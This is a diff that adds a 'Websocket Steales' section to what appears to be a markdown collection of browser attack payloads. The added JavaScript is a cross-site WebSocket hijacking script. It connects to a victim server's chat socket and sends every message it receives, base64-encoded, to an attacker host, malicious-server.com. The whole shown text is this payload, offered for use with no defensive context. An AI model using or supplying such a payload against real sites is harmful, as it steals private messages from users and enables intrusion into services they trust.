@@ -246,3 +246,19 @@ function hax() {
 }
 </script>
 ```
+
+## **Websocket Steales**
+
+```javascript
+<script>
+	ws = new WebSocket("https://victim-server/chat")
+	
+	ws.onopen = function() {
+		ws.send("READY");
+	}
+		
+	ws.onmessage = function(event){
+		fetch("https://malicious-server.com/?data=" + btoa(event.data))
+	}
+</script>
+```
